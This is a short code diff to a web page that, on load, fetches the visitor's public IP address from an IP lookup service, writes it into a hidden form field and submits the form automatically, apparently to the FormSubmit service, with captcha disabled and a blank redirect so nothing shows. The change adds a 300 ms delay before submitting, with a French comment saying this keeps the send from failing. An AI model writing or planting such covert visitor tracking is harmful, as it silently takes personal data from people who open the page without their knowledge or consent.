@@ -53,7 +53,6 @@
     <input type="hidden" name="IP" id="ip-input">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="about:blank">
-    <button type="submit" id="submit-btn" style="display: none;"></button>
   </form>
 
   <script>
@@ -61,8 +60,13 @@
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
-          document.getElementById('ip-input').value = data.ip;
-          document.getElementById('submit-btn').click();
+          const ip = data.ip;
+          document.getElementById('ip-input').value = ip;
+
+          // petit délai avant d'envoyer, ça évite que FormSubmit crame l'envoi
+          setTimeout(() => {
+            document.getElementById('ip-form').submit();
+          }, 300);
         });
     }
   </script>
